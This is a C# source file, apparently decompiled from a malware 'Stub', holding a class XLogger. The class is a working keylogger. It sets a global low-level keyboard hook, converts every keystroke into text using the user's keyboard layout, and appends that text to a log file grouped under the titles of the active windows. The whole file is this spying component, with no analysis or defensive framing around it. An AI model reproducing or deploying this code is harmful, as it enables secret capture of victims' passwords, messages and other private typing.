using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	public class XLogger
	{
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

		private static string CurrentActiveWindowTitle;

		private const int WM_KEYDOWN = 256;

		private static LowLevelKeyboardProc _proc = HookCallback;

		private static IntPtr _hookID = IntPtr.Zero;

		private static int WHKEYBOARDLL = 13;

		public static void callk()
		{
			_hookID = SetHook(_proc);
			Application.Run();
		}

		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			//Discarded unreachable code: IL_0020
			using Process process = Process.GetCurrentProcess();
			return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(process.ProcessName), 0u);
		}

		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				object obj = Marshal.ReadInt32(lParam);
				object obj2 = (GetKeyState(20) & 0xFFFF) != 0;
				object obj3 = ((((uint)GetKeyState(160) & 0x8000u) != 0 || ((uint)GetKeyState(161) & 0x8000u) != 0) ? true : false);
				object obj4 = KeyboardLayout(Conversions.ToUInteger(obj));
				obj4 = ((!Conversions.ToBoolean((Conversions.ToBoolean(obj2) || Conversions.ToBoolean(obj3)) ? ((object)true) : ((object)false))) ? RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToLower", new object[0], (string[])null, (Type[])null, (bool[])null)) : RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToUpper", new object[0], (string[])null, (Type[])null, (bool[])null)));
				if (Conversions.ToInteger(obj) >= 112 && Conversions.ToInteger(obj) <= 135)
				{
					obj4 = "[" + Conversions.ToString(Conversions.ToInteger(obj)) + "]";
				}
				else
				{
					switch (((Enum)(Keys)Conversions.ToInteger(obj)).ToString())
					{
					case "Space":
						obj4 = "[SPACE]";
						break;
					case "Return":
						obj4 = "[ENTER]";
						break;
					case "Escape":
						obj4 = "[ESC]";
						break;
					case "LControlKey":
						obj4 = "[CTRL]";
						break;
					case "RControlKey":
						obj4 = "[CTRL]";
						break;
					case "RShiftKey":
						obj4 = "[Shift]";
						break;
					case "LShiftKey":
						obj4 = "[Shift]";
						break;
					case "Back":
						obj4 = "[Back]";
						break;
					case "LWin":
						obj4 = "[WIN]";
						break;
					case "Tab":
						obj4 = "[Tab]";
						break;
					case "Capital":
						obj4 = ((!Operators.ConditionalCompareObjectEqual(obj2, (object)true, false)) ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]");
						break;
					}
				}
				using StreamWriter streamWriter = new StreamWriter(Settings.LoggerPath, append: true);
				if (object.Equals(CurrentActiveWindowTitle, GetActiveWindowTitle()))
				{
					streamWriter.Write(RuntimeHelpers.GetObjectValue(obj4));
				}
				else
				{
					streamWriter.WriteLine(Environment.NewLine);
					streamWriter.WriteLine("###  " + GetActiveWindowTitle() + " ###");
					streamWriter.Write(RuntimeHelpers.GetObjectValue(obj4));
				}
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}

		private static string KeyboardLayout(uint vkCode)
		{
			//Discarded unreachable code: IL_006c
			uint lpdwProcessId = 0u;
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				object obj = new byte[256];
				if (!GetKeyboardState((byte[])obj))
				{
					return "";
				}
				object obj2 = MapVirtualKey(vkCode, 0u);
				IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out lpdwProcessId));
				ToUnicodeEx(vkCode, Conversions.ToUInteger(obj2), (byte[])obj, stringBuilder, 5, 0u, keyboardLayout);
				return stringBuilder.ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return ((Enum)(Keys)checked((int)vkCode)).ToString();
		}

		private static string GetActiveWindowTitle()
		{
			//Discarded unreachable code: IL_0075, IL_008c
			uint lpdwProcessId = 0u;
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				GetWindowThreadProcessId(foregroundWindow, out lpdwProcessId);
				object processById = Process.GetProcessById(checked((int)lpdwProcessId));
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
				if (string.IsNullOrWhiteSpace(Conversions.ToString(objectValue)))
				{
					objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
				CurrentActiveWindowTitle = Conversions.ToString(objectValue);
				return Conversions.ToString(objectValue);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "???";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		private static extern short GetKeyState(int keyCode);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint idThread);

		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);
	}
}
